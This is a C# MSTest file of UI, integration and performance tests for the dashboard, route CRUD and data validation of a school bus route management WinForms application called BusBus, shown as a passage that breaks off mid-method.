#nullable enable
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Configuration;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Linq;
using System.Threading;
using System.Collections.Concurrent;
using System.Drawing;
using BusBus.UI;
using BusBus.Models;
using BusBus.Services;
using BusBus.DataAccess;

namespace BusBus.Tests.UI
{
    [TestClass]
    public class DashboardUIDebugTests
    {
        private IServiceProvider? _serviceProvider;
        private TestContext? _testContext;

        public TestContext? TestContext
        {
            get { return _testContext; }
            set { _testContext = value; }
        }
        private static bool _formsInitialized;
        private static readonly object _formsInitLock = new object();
        private static readonly string[] _themesToTest = new[] { "Light", "Dark" };

        [TestInitialize]
        public async Task TestInitialize()
        {
            // Initialize Windows Forms application for testing (only once per test run)
            lock (_formsInitLock)
            {
                if (!_formsInitialized)
                {
                    try
                    {
                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        _formsInitialized = true;
                    }
                    catch (InvalidOperationException)
                    {
                        // Already initialized - this is expected in some test scenarios
                        _formsInitialized = true;
                    }
                }
            }

            // Build test service provider
            var services = new ServiceCollection();

            // Add configuration
            var configuration = new ConfigurationBuilder()
                .SetBasePath(AppDomain.CurrentDomain.BaseDirectory)
                .AddJsonFile("appsettings.json", optional: true)
                .AddJsonFile("appsettings.Development.json", optional: true)
                .Build();

            services.AddSingleton<IConfiguration>(configuration);

            // Add logging for tests
            services.AddLogging(builder =>
            {
                builder.AddConsole();
                builder.AddDebug();
                builder.SetMinimumLevel(LogLevel.Debug);
            });

            // Add Entity Framework with test database
            var connectionString = configuration.GetConnectionString("DefaultConnection")
                ?? "Server=localhost\\SQLEXPRESS;Database=BusBusDB;Trusted_Connection=true;TrustServerCertificate=true;";

            services.AddDbContext<AppDbContext>(options =>
            {
                options.UseSqlServer(connectionString);
                options.EnableSensitiveDataLogging();
                options.EnableDetailedErrors();
            });

            // Add application services
            services.AddScoped<IRouteService, RouteService>();
            services.AddScoped<IDriverService, DriverService>();
            services.AddScoped<IVehicleService, VehicleService>();

            // Add UI components
            services.AddTransient<Dashboard>();
            services.AddTransient<DashboardOverviewView>();

            _serviceProvider = services.BuildServiceProvider();

            // Ensure database is available
            using var scope = _serviceProvider.CreateScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();
            await dbContext.Database.EnsureCreatedAsync();
        }

        [TestCleanup]
        public void TestCleanup()
        {
            if (_serviceProvider is IDisposable disposable)
            {
                disposable.Dispose();
            }
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("Integration")]
        public async Task TestDatabaseConnection()
        {
            // Arrange
            using var scope = _serviceProvider!.CreateScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();

            // Act & Assert
            var canConnect = await dbContext.Database.CanConnectAsync();
            Assert.IsTrue(canConnect, "Database connection should be successful");

            var routeCount = await dbContext.Routes.CountAsync();
            var driverCount = await dbContext.Drivers.CountAsync();
            var vehicleCount = await dbContext.Vehicles.CountAsync();

            TestContext?.WriteLine($"Database contains: {routeCount} routes, {driverCount} drivers, {vehicleCount} vehicles");
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("Integration")]
        public void TestServiceResolution()
        {
            // Arrange & Act
            using var scope = _serviceProvider!.CreateScope();

            var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();
            var driverService = scope.ServiceProvider.GetRequiredService<IDriverService>();
            var vehicleService = scope.ServiceProvider.GetRequiredService<IVehicleService>();

            // Assert
            Assert.IsNotNull(routeService, "RouteService should be resolvable");
            Assert.IsNotNull(driverService, "DriverService should be resolvable");
            Assert.IsNotNull(vehicleService, "VehicleService should be resolvable");
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("Integration")]
        public async Task TestDashboardCreation()
        {
            // Arrange
            var tcs = new TaskCompletionSource<bool>();
            Exception? testException = null;

            // Act - Create dashboard on STA thread
            var thread = new Thread(() =>
            {
                try
                {
                    using var scope = _serviceProvider!.CreateScope();
                    var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();
                    var logger = scope.ServiceProvider.GetRequiredService<ILogger<Dashboard>>();

                    var dashboard = new Dashboard(scope.ServiceProvider, routeService, logger);

                    // Force handle creation without showing
                    var handle = dashboard.Handle;

                    tcs.SetResult(handle != IntPtr.Zero);
                    dashboard.Dispose();
                }
                catch (Exception ex)
                {
                    testException = ex;
                    tcs.SetResult(false);
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            var result = await tcs.Task;

            // Assert
            if (testException != null)
            {
                TestContext?.WriteLine($"Dashboard creation failed with exception: {testException}");
            }

            Assert.IsTrue(result, $"Dashboard should be created successfully. Exception: {testException?.Message}");
        }
        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("Integration")]
        [Timeout(15000)] // 15 second timeout
        public void TestDashboardViewCreationAndRouteViewLoading()
        {
            // Arrange
            var result = (created: false, routeViewLoaded: false, details: "");
            Exception? testException = null;
            var testCompleted = new System.Threading.ManualResetEventSlim(false);            // Act - Create DashboardView on STA thread without Application.Run
            var thread = new Thread(() =>
            {
                try
                {
                    using var scope = _serviceProvider!.CreateScope();
                    var dashboardView = new DashboardOverviewView(scope.ServiceProvider);

                    var created = false;
                    var routeViewLoaded = false;
                    var details = "";

                    using (var form = new Form())
                    {
                        form.WindowState = FormWindowState.Minimized;
                        form.ShowInTaskbar = false;
                        form.Controls.Add(dashboardView);
                        dashboardView.Dock = DockStyle.Fill;

                        // Force handle creation and layout
                        var handle = form.Handle; // Forces window creation
                        form.Show();
                        Application.DoEvents(); // Process initial events

                        try
                        {
                            details += "Form shown and handle created. ";

                            // Give time for layout to complete
                            var startTime = DateTime.Now;
                            var maxWaitTime = TimeSpan.FromSeconds(3);

                            while (DateTime.Now - startTime < maxWaitTime)
                            {
                                Application.DoEvents();
                                Thread.Sleep(50);

                                // Check for route view components
                                var routeGridFound = false;
                                foreach (Control control in dashboardView.Controls)
                                {
                                    if (control is TableLayoutPanel mainLayout)
                                    {
                                        details += "Found main layout. ";
                                        foreach (Control child in mainLayout.Controls)
                                        {
                                            if (child is Panel contentPanel && contentPanel.Controls.Count > 0)
                                            {
                                                details += $"Found content panel with {contentPanel.Controls.Count} controls. ";
                                                foreach (Control gridControl in contentPanel.Controls)
                                                {
                                                    details += $"Control: {gridControl.GetType().Name}, Visible: {gridControl.Visible}. ";
                                                    if (gridControl.Visible && (gridControl.GetType().Name.Contains("DataGrid") || gridControl.GetType().Name.Contains("DynamicDataGridView")))
                                                    {
                                                        routeGridFound = true;
                                                        details += "Route grid found and visible. ";
                                                        break;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }

                                if (routeGridFound)
                                {
                                    routeViewLoaded = true;
                                    break;
                                }
                            }

                            created = dashboardView.Handle != IntPtr.Zero;
                            result = (created, routeViewLoaded, details);

                            details += $"Final result - Created: {created}, RouteViewLoaded: {routeViewLoaded}. ";
                        }
                        catch (Exception processEx)
                        {
                            details += $"Processing exception: {processEx.Message}. ";
                            result = (false, false, details);
                        }
                        finally
                        {
                            // Clean shutdown without message loop
                            try
                            {
                                form.Hide();
                                Application.DoEvents(); // Process hide event
                            }
                            catch (Exception hideEx)
                            {
                                details += $"Hide exception: {hideEx.Message}. ";
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    testException = ex;
                    result = (false, false, $"Exception: {ex.Message}");
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            // Wait for test completion or timeout
            if (!testCompleted.Wait(10000))
            {
                result.details += "Test timeout. ";
                testCompleted.Set();
            }

            // Ensure thread completes
            if (thread.IsAlive)
            {
                thread.Join(1000); // Give it 1 more second to finish
            }

            // Assert
            TestContext?.WriteLine($"Test details: {result.details}");

            if (testException != null)
            {
                TestContext?.WriteLine($"DashboardView test failed with exception: {testException}");
            }

            Assert.IsTrue(result.created, $"DashboardView should be created successfully. Details: {result.details}");
            TestContext?.WriteLine($"DashboardView created: {result.created}");

            // Note: Route view loading test is more lenient since it depends on timing
            if (!result.routeViewLoaded)
            {
                TestContext?.WriteLine($"Route view loading test inconclusive - may need more time or different approach. Details: {result.details}");
            }
        }

        [TestMethod]
        [TestCategory("Integration")]
        public async Task TestCrudOperations()
        {
            // Arrange
            using var scope = _serviceProvider!.CreateScope();
            var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

            var testRoute = new Route
            {
                RouteName = "Test Route - MSTest",
                RouteDate = DateTime.Today,
                AMStartingMileage = 100,
                PMEndingMileage = 150,
                AMRiders = 25,
                PMRiders = 25,
                DriverId = null,
                VehicleId = null
            };

            try
            {
                // Test Create
                await routeService.CreateRouteAsync(testRoute);
                Assert.IsTrue(testRoute.Id != Guid.Empty, "Route should have been assigned an ID after creation");

                // Test Read
                var allRoutes = await routeService.GetRoutesAsync();
                var createdRoute = allRoutes.FirstOrDefault(r => r.RouteName == "Test Route - MSTest");
                Assert.IsNotNull(createdRoute, "Created route should be retrievable");

                // Test Update
                createdRoute.AMRiders = 30;
                await routeService.UpdateRouteAsync(createdRoute);

                var updatedRoute = await routeService.GetRouteByIdAsync(createdRoute.Id);
                Assert.AreEqual(30, updatedRoute?.AMRiders, "Route should be updated with new riders count");

                // Test Delete
                await routeService.DeleteRouteAsync(createdRoute.Id);
                var deletedRoute = await routeService.GetRouteByIdAsync(createdRoute.Id);
                Assert.IsNull(deletedRoute, "Route should be deleted");
            }
            catch (Exception ex)
            {
                TestContext?.WriteLine($"CRUD test failed: {ex.Message}");
                throw;
            }
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("Performance")]
        public async Task TestStartupPerformance()
        {
            // Arrange
            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            var results = new System.Collections.Generic.Dictionary<string, long>();

            // Test service provider creation time
            var serviceCreationTime = stopwatch.ElapsedMilliseconds;
            results["ServiceProvider"] = serviceCreationTime;

            // Test database connection time
            var dbStart = stopwatch.ElapsedMilliseconds;
            using (var scope = _serviceProvider!.CreateScope())
            {
                var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();
                await dbContext.Database.CanConnectAsync();
            }
            results["DatabaseConnection"] = stopwatch.ElapsedMilliseconds - dbStart;

            // Test dashboard creation time
            var dashboardStart = stopwatch.ElapsedMilliseconds;
            var tcs = new TaskCompletionSource<bool>();

            var thread = new Thread(() =>
            {
                try
                {
                    using var scope = _serviceProvider?.CreateScope();
                    var routeService = scope?.ServiceProvider.GetRequiredService<IRouteService>();
                    var logger = scope?.ServiceProvider.GetRequiredService<ILogger<Dashboard>>();

                    if (scope != null && routeService != null && logger != null)
                    {
                        var dashboard = new Dashboard(scope.ServiceProvider, routeService, logger);
                        var handle = dashboard.Handle; // Force creation
                        dashboard.Dispose();
                    }

                    tcs.SetResult(true);
                }
                catch (Exception ex)
                {
                    tcs.SetException(ex);
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            await tcs.Task;

            results["DashboardCreation"] = stopwatch.ElapsedMilliseconds - dashboardStart;

            stopwatch.Stop();
            results["Total"] = stopwatch.ElapsedMilliseconds;

            // Assert performance benchmarks
            foreach (var result in results)
            {
                TestContext?.WriteLine($"{result.Key}: {result.Value}ms");
            }

            Assert.IsTrue(results["Total"] < 10000, $"Total startup time should be under 10 seconds. Actual: {results["Total"]}ms");
            Assert.IsTrue(results["DatabaseConnection"] < 5000, $"Database connection should be under 5 seconds. Actual: {results["DatabaseConnection"]}ms");
        }

        [TestMethod]
        [TestCategory("BusBus")]
        [TestCategory("Integration")]
        public async Task TestBusBusInfoCompliantRoutes()
        {
            // Test based on BusBus Info specifications: Four routes per school day
            using var scope = _serviceProvider!.CreateScope();
            var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

            var testDate = DateTime.Today;
            var standardRoutes = new[]
            {
                "Truck Plaza",  // Default Bus 17 per BusBus Info
                "East Route",
                "West Route",
                "SPED Route"
            };

            var createdRoutes = new List<Route>();

            try
            {
                // Create all four standard routes for a school day
                foreach (var routeName in standardRoutes)
                {
                    var route = new Route
                    {
                        RouteName = routeName,
                        RouteDate = testDate,
                        AMStartingMileage = 10000 + Array.IndexOf(standardRoutes, routeName) * 100,
                        AMEndingMileage = 10025 + Array.IndexOf(standardRoutes, routeName) * 100,
                        PMStartMileage = 10025 + Array.IndexOf(standardRoutes, routeName) * 100, // PM Start = AM End per BusBus Info
                        PMEndingMileage = 10050 + Array.IndexOf(standardRoutes, routeName) * 100,
                        AMRiders = 20 + Array.IndexOf(standardRoutes, routeName) * 5, // Varying rider counts
                        PMRiders = 18 + Array.IndexOf(standardRoutes, routeName) * 5,
                        IsActive = true,
                        CreatedDate = DateTime.Now,
                        CreatedBy = "BusBus Test System"
                    };

                    // Truck Plaza gets Bus 17 by default per BusBus Info
                    if (routeName == "Truck Plaza")
                    {
                        // Note: VehicleId would be set to Bus 17's ID in real implementation
                        TestContext?.WriteLine("Truck Plaza route should default to Bus 17");
                    }

                    await routeService.CreateRouteAsync(route);
                    createdRoutes.Add(route);
                    TestContext?.WriteLine($"✓ Created {routeName} route for {testDate:dd-MM-yy}");
                }

                // Verify all routes were created
                var allRoutes = await routeService.GetRoutesAsync();
                var todaysRoutes = allRoutes.Where(r => r.RouteDate.Date == testDate.Date).ToList();

                Assert.AreEqual(4, todaysRoutes.Count, "Should have exactly 4 routes for the school day");

                // Verify each standard route exists
                foreach (var expectedRoute in standardRoutes)
                {
                    var foundRoute = todaysRoutes.FirstOrDefault(r => r.RouteName == expectedRoute);
                    Assert.IsNotNull(foundRoute, $"{expectedRoute} should exist for the school day");

                    // Verify AM/PM structure per BusBus Info
                    Assert.IsTrue(foundRoute.AMStartingMileage > 0, $"{expectedRoute} should have AM starting mileage");
                    Assert.IsTrue(foundRoute.AMEndingMileage > foundRoute.AMStartingMileage, $"{expectedRoute} AM ending should be > starting"); Assert.IsTrue(foundRoute.PMStartMileage >= foundRoute.AMEndingMileage, $"{expectedRoute} PM start should be >= AM end");
                    Assert.IsTrue(foundRoute.PMEndingMileage > foundRoute.PMStartMileage, $"{expectedRoute} PM ending should be > PM starting");
                }

                TestContext?.WriteLine("✓ All BusBus Info route specifications verified");
            }
            finally
            {
                // Cleanup
                foreach (var route in createdRoutes)
                {
                    try
                    {
                        await routeService.DeleteRouteAsync(route.Id);
                    }
                    catch (Exception ex)
                    {
                        TestContext?.WriteLine($"Cleanup warning: Could not delete route {route.RouteName}: {ex.Message}");
                    }
                }
            }
        }
        [TestMethod]
        [TestCategory("BusBus")]
        [TestCategory("UI")]
        [Timeout(15000)] // 15 second timeout
        public async Task TestBusBusInfoDashboardIntegration()
        {
            // Test the complete dashboard startup with BusBus Info compliance
            var tcs = new TaskCompletionSource<(bool success, List<string> details)>();
            var details = new List<string>();

            var thread = new Thread(() =>
            {
                try
                {
                    details.Add("Starting BusBus Info dashboard integration test");

                    using var scope = _serviceProvider!.CreateScope();
                    var dashboardView = new DashboardOverviewView(scope.ServiceProvider);

                    // Force handle creation
                    var handle = dashboardView.Handle;
                    details.Add($"Dashboard handle created: {handle != IntPtr.Zero}");

                    if (handle != IntPtr.Zero)
                    {
                        var loadEventFired = false;
                        var routeViewVisible = false;

                        using (var form = new Form())
                        {
                            form.WindowState = FormWindowState.Minimized;
                            form.ShowInTaskbar = false;
                            form.Controls.Add(dashboardView);
                            dashboardView.Dock = DockStyle.Fill;

                            // Force handle creation and show form
                            var formHandle = form.Handle;
                            form.Show();
                            Application.DoEvents();

                            try
                            {
                                loadEventFired = true;
                                details.Add("Dashboard Load event fired");

                                // Wait for route view initialization
                                Thread.Sleep(1000);
                                Application.DoEvents();

                                // Check for BusBus Info compliant UI elements
                                form.Invoke(() =>
                                {
                                    // Look for the main layout and route grid
                                    foreach (Control control in dashboardView.Controls)
                                    {
                                        if (control is TableLayoutPanel mainLayout)
                                        {
                                            details.Add("Found main TableLayoutPanel");

                                            // Check for side panel with route navigation
                                            var sidePanelFound = false;
                                            var contentPanelFound = false;
                                            var crudPanelFound = false;
                                            var statsPanelFound = false;

                                            foreach (Control child in mainLayout.Controls)
                                            {
                                                if (child is Panel panel)
                                                {
                                                    // Side panel should be 250px wide per design
                                                    if (panel.Width == 250 || panel.Bounds.Width == 250)
                                                    {
                                                        sidePanelFound = true;
                                                        details.Add("Found side panel (250px width)");

                                                        // Check for navigation buttons
                                                        var routeButtonFound = false;
                                                        var driverButtonFound = false;
                                                        var vehicleButtonFound = false;

                                                        foreach (Control sideControl in panel.Controls)
                                                        {
                                                            if (sideControl is Button btn)
                                                            {
                                                                var btnText = btn.Text?.ToLower() ?? "";
                                                                if (btnText.Contains("route")) routeButtonFound = true;
                                                                if (btnText.Contains("driver")) driverButtonFound = true;
                                                                if (btnText.Contains("vehicle")) vehicleButtonFound = true;
                                                            }
                                                        }

                                                        details.Add($"Navigation buttons - Routes: {routeButtonFound}, Drivers: {driverButtonFound}, Vehicles: {vehicleButtonFound}");
                                                    }
                                                    else if (panel.Dock == DockStyle.Fill || panel.Width > 250)
                                                    {
                                                        contentPanelFound = true;
                                                        details.Add("Found content panel");

                                                        // Check for data grid in content panel
                                                        foreach (Control contentControl in panel.Controls)
                                                        {
                                                            var controlType = contentControl.GetType().Name;
                                                            if (controlType.Contains("DataGrid") || controlType.Contains("DynamicDataGridView"))
                                                            {
                                                                routeViewVisible = contentControl.Visible;
                                                                details.Add($"Found data grid: {controlType}, Visible: {routeViewVisible}");
                                                            }
                                                        }
                                                    }
                                                    else if (panel.Height <= 120 && panel.Height > 50)
                                                    {
                                                        crudPanelFound = true;
                                                        details.Add("Found CRUD panel");
                                                    }
                                                    else if (panel.Height <= 80)
                                                    {
                                                        statsPanelFound = true;
                                                        details.Add("Found stats panel");
                                                    }
                                                }
                                            }

                                            details.Add($"UI Layout - Side: {sidePanelFound}, Content: {contentPanelFound}, CRUD: {crudPanelFound}, Stats: {statsPanelFound}");
                                        }
                                    }
                                });

                                var overallSuccess = loadEventFired && routeViewVisible;
                                tcs.SetResult((overallSuccess, details));
                            }
                            catch (Exception processEx)
                            {
                                details.Add($"Processing error: {processEx.Message}");
                                tcs.SetResult((false, details));
                            }
                            finally
                            {
                                // Clean shutdown without message loop
                                try
                                {
                                    form.Hide();
                                    Application.DoEvents();
                                }
                                catch (Exception hideEx)
                                {
                                    details.Add($"Hide exception: {hideEx.Message}");
                                }
                            }
                        }
                    }
                    else
                    {
                        tcs.SetResult((false, details));
                    }

                    dashboardView.Dispose();
                }
                catch (Exception ex)
                {
                    details.Add($"Dashboard integration test exception: {ex.Message}");
                    tcs.SetResult((false, details));
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            var (success, testDetails) = await tcs.Task;

            // Ensure thread completes
            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log all details
            foreach (var detail in testDetails)
            {
                TestContext?.WriteLine(detail);
            }

            // Assertions
            Assert.IsTrue(testDetails.Any(d => d.Contains("Dashboard handle created: True")), "Dashboard should be created");
            Assert.IsTrue(testDetails.Any(d => d.Contains("Load event fired")), "Load event should fire");
            Assert.IsTrue(testDetails.Any(d => d.Contains("Found main TableLayoutPanel")), "Main layout should be found");

            // Note: Route view visibility test is more lenient due to timing dependencies
            TestContext?.WriteLine($"Overall BusBus Info dashboard integration test: {(success ? "SUCCESS" : "PARTIAL SUCCESS")}");
        }

        // =============================================================================
        // ROBUST TEST ADDITIONS - Error Handling & Edge Cases
        // =============================================================================        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("ErrorHandling")]
        [Timeout(10000)]
        public void TestDashboardWithInvalidDatabaseConnection()
        {
            // Test resilience when database is unavailable
            var invalidServices = new ServiceCollection();

            // Add configuration with invalid connection string
            var invalidConfig = new ConfigurationBuilder()
                .AddInMemoryCollection(new Dictionary<string, string?>
                {
                    ["ConnectionStrings:DefaultConnection"] = "Server=invalid;Database=invalid;Trusted_Connection=true;"
                })
                .Build();

            invalidServices.AddSingleton<IConfiguration>(invalidConfig);
            invalidServices.AddLogging(builder => builder.AddConsole().SetMinimumLevel(LogLevel.Warning));

            // Add Entity Framework with invalid connection
            invalidServices.AddDbContext<AppDbContext>(options =>
            {
                options.UseSqlServer(invalidConfig.GetConnectionString("DefaultConnection"));
            });

            // Add services with fallback behaviors
            invalidServices.AddScoped<IRouteService, RouteService>();
            invalidServices.AddTransient<DashboardView>();

            var invalidServiceProvider = invalidServices.BuildServiceProvider();

            var testCompleted = new ManualResetEventSlim(false);
            var dashboardCreated = false;
            Exception? capturedException = null;

            var thread = new Thread(() =>
            {
                try
                {
                    using var scope = invalidServiceProvider.CreateScope();

                    // Dashboard should handle database connection gracefully
                    var dashboardView = new DashboardOverviewView(scope.ServiceProvider);
                    dashboardCreated = dashboardView.Handle != IntPtr.Zero;

                    dashboardView.Dispose();
                }
                catch (Exception ex)
                {
                    capturedException = ex;
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            testCompleted.Wait(8000);

            // Assert: Dashboard should either gracefully handle the error or provide meaningful feedback
            TestContext?.WriteLine($"Dashboard created with invalid DB: {dashboardCreated}");
            TestContext?.WriteLine($"Exception: {capturedException?.Message ?? "None"}");

            // Either successful graceful degradation OR controlled failure with proper exception
            Assert.IsTrue(dashboardCreated || capturedException != null,
                "Dashboard should either handle invalid DB gracefully or fail with proper exception");

            invalidServiceProvider.Dispose();
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("DataValidation")]
        [Timeout(10000)]
        public async Task TestRouteDataValidationAndConstraints()
        {
            // Test business rule validation for route data
            using var scope = _serviceProvider!.CreateScope();
            var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

            var validationTestCases = new[]
            {
                // Test Case 1: Negative mileage
                new {
                    Route = new Route {
                        RouteName = "Negative Test",
                        RouteDate = DateTime.Today,
                        AMStartingMileage = -100,
                        AMEndingMileage = 50,
                        AMRiders = 10, PMRiders = 10
                    },
                    ShouldFail = true,
                    Reason = "Negative starting mileage should be invalid"
                },

                // Test Case 2: PM Start < AM End (violates BusBus Info rule)
                new {
                    Route = new Route {
                        RouteName = "PM Before AM Test",
                        RouteDate = DateTime.Today,
                        AMStartingMileage = 100,
                        AMEndingMileage = 150,
                        PMStartMileage = 140, // Should be >= 150
                        PMEndingMileage = 180,
                        AMRiders = 10, PMRiders = 10
                    },
                    ShouldFail = true,
                    Reason = "PM start should be >= AM end per BusBus Info"
                },

                // Test Case 3: Future date beyond reasonable limit
                new {
                    Route = new Route {
                        RouteName = "Future Test",
                        RouteDate = DateTime.Today.AddYears(2),
                        AMStartingMileage = 100,
                        AMEndingMileage = 150,
                        AMRiders = 10, PMRiders = 10
                    },
                    ShouldFail = true,
                    Reason = "Routes more than 1 year in future should be invalid"
                },

                // Test Case 4: Excessive rider count
                new {
                    Route = new Route {
                        RouteName = "Overcapacity Test",
                        RouteDate = DateTime.Today,
                        AMStartingMileage = 100,
                        AMEndingMileage = 150,
                        AMRiders = 1000, // Unrealistic for a school bus
                        PMRiders = 10
                    },
                    ShouldFail = true,
                    Reason = "Rider count should have reasonable limits"
                },

                // Test Case 5: Valid route for comparison
                new {
                    Route = new Route {
                        RouteName = "Valid Test Route",
                        RouteDate = DateTime.Today,
                        AMStartingMileage = 100,
                        AMEndingMileage = 125,
                        PMStartMileage = 125,
                        PMEndingMileage = 150,
                        AMRiders = 25, PMRiders = 23
                    },
                    ShouldFail = false,
                    Reason = "Valid route should succeed"
                }
            };

            var results = new List<(string TestCase, bool ActualResult, string ExpectedResult)>();

            foreach (var testCase in validationTestCases)
            {
                try
                {
                    await routeService.CreateRouteAsync(testCase.Route);

                    // If we get here, creation succeeded
                    results.Add((testCase.Reason, false, testCase.ShouldFail ? "Should Fail" : "Should Succeed"));

                    // Cleanup
                    await routeService.DeleteRouteAsync(testCase.Route.Id);
                }
                catch (Exception ex)
                {
                    // Creation failed
                    results.Add((testCase.Reason, true, testCase.ShouldFail ? "Should Fail" : "Should Succeed"));
                    TestContext?.WriteLine($"Validation test '{testCase.Reason}': {ex.Message}");
                }
            }

            // Analyze results
            foreach (var result in results)
            {
                TestContext?.WriteLine($"✓ {result.TestCase}: Failed={result.ActualResult}, Expected={result.ExpectedResult}");
            }

            // At least some validation should be in place
            var validationWorking = results.Any(r => r.ExpectedResult == "Should Fail" && r.ActualResult);
            TestContext?.WriteLine($"Data validation working: {validationWorking}");
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("UserInteraction")]
        [Timeout(15000)]
        public void TestDashboardNavigationAndStateManagement()
        {
            // Test user interaction patterns and UI state management
            var testCompleted = new ManualResetEventSlim(false);
            var navigationResults = new List<string>();
            Exception? testException = null;

            var thread = new Thread(() =>
            {
                try
                {
                    using var scope = _serviceProvider!.CreateScope();
                    var dashboardView = new DashboardOverviewView(scope.ServiceProvider);

                    using var form = new Form();
                    form.WindowState = FormWindowState.Minimized;
                    form.ShowInTaskbar = false;
                    form.Controls.Add(dashboardView);
                    dashboardView.Dock = DockStyle.Fill;

                    var handle = form.Handle;
                    form.Show();
                    Application.DoEvents();

                    navigationResults.Add("Dashboard initialized");

                    // Test 1: Find and test navigation buttons
                    var navigationButtons = new List<Button>();
                    foreach (Control control in dashboardView.Controls)
                    {
                        if (control is TableLayoutPanel mainLayout)
                        {
                            foreach (Control child in mainLayout.Controls)
                            {
                                if (child is Panel sidePanel && (sidePanel.Width == 250 || sidePanel.Bounds.Width == 250))
                                {
                                    foreach (Control sideControl in sidePanel.Controls)
                                    {
                                        if (sideControl is Button btn)
                                        {
                                            navigationButtons.Add(btn);
                                            navigationResults.Add($"Found navigation button: {btn.Text ?? btn.Name}");
                                        }
                                    }
                                }
                            }
                        }
                    }

                    // Test 2: Simulate button clicks and state changes
                    foreach (var button in navigationButtons.Take(3)) // Test first 3 buttons
                    {
                        try
                        {
                            var originalText = button.Text;
                            var originalBackColor = button.BackColor;

                            // Simulate click
                            button.PerformClick();
                            Application.DoEvents();
                            Thread.Sleep(100);

                            navigationResults.Add($"Clicked button '{originalText}' - no exceptions");

                            // Check for visual state changes
                            if (button.BackColor != originalBackColor)
                            {
                                navigationResults.Add($"Button '{originalText}' changed visual state (color)");
                            }
                        }
                        catch (Exception btnEx)
                        {
                            navigationResults.Add($"Button click failed: {btnEx.Message}");
                        }
                    }

                    // Test 3: Check for data grid interaction
                    var dataGrids = new List<Control>();
                    foreach (Control control in dashboardView.Controls)
                    {
                        if (control is TableLayoutPanel mainLayout)
                        {
                            foreach (Control child in mainLayout.Controls)
                            {
                                foreach (Control grandchild in child.Controls)
                                {
                                    if (grandchild.GetType().Name.Contains("DataGrid"))
                                    {
                                        dataGrids.Add(grandchild);
                                        navigationResults.Add($"Found data grid: {grandchild.GetType().Name}");
                                    }
                                }
                            }
                        }
                    }

                    navigationResults.Add($"Total navigation elements found: Buttons={navigationButtons.Count}, DataGrids={dataGrids.Count}");

                    form.Hide();
                    Application.DoEvents();
                }
                catch (Exception ex)
                {
                    testException = ex;
                    navigationResults.Add($"Navigation test exception: {ex.Message}");
                }
                finally
                {
                    testCompleted.Set();
                }
            });

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            testCompleted.Wait(12000);

            if (thread.IsAlive)
            {
                thread.Join(1000);
            }

            // Log all navigation test results
            foreach (var result in navigationResults)
            {
                TestContext?.WriteLine(result);
            }

            if (testException != null)
            {
                TestContext?.WriteLine($"Navigation test exception: {testException}");
            }

            // Assertions
            Assert.IsTrue(navigationResults.Any(r => r.Contains("Dashboard initialized")), "Dashboard should initialize");
            Assert.IsTrue(navigationResults.Any(r => r.Contains("Found navigation button") || r.Contains("Found data grid")),
                "Should find interactive elements");

            var interactiveElementsCount = navigationResults.Count(r => r.Contains("Found navigation button") || r.Contains("Found data grid"));
            TestContext?.WriteLine($"Interactive elements found: {interactiveElementsCount}");
        }

        [TestMethod]
        [TestCategory("UI")]
        [TestCategory("Performance")]
        [TestCategory("StressTest")]
        public async Task TestDashboardUnderLoad()
        {
            // Test dashboard performance with multiple concurrent operations
            var concurrentTasks = new List<Task>();
            var results = new ConcurrentBag<(string Operation, long DurationMs, bool Success)>();

            // Simulate multiple concurrent database operations
            for (int i = 0; i < 5; i++)
            {
                var taskId = i;
                concurrentTasks.Add(Task.Run(async () =>
                {
                    var stopwatch = System.Diagnostics.Stopwatch.StartNew();
                    try
                    {
                        using var scope = _serviceProvider!.CreateScope();
                        var routeService = scope.ServiceProvider.GetRequiredService<IRouteService>();

                        // Create test route
                        var route = new Route
                        {
                            RouteName = $"Load Test Route {taskId}",
                            RouteDate = DateTime.Today.AddDays(taskId),
                            AMStartingMileage = 1000 + taskId * 100,
                            AMEndingMileage = 1025 + taskId * 100,
                            AMRiders = 20 + taskId,
                            PMRiders = 18 + taskId
                        };

                        await routeService.CreateRouteAsync(route);
                        await routeService.GetRouteByIdAsync(route.Id);
                        await routeService.DeleteRouteAsync(route.Id);

                        stopwatch.Stop();
                        results.Add(($"DB Operation {taskId}", stopwatch.ElapsedMilliseconds, true));
                    }
                    catch (Exception ex)
                    {
                        stopwatch.Stop();
                        results.Add(($"DB Operation {taskId}", stopwatch.ElapsedMilliseconds, false));
                        TestContext?.WriteLine($"Load test task {taskId} failed: {ex.Message}");
                    }
                }));
            }

            // Simulate UI creation under load
            for (int i = 0; i < 3; i++)
            {
                var taskId = i;
                concurrentTasks.Add(Task.Run(() =>
                {
                    var stopwatch = System.Diagnostics.Stopwatch.StartNew();
                    try
                    {
                        var tcs = new TaskCompletionSource<bool>();
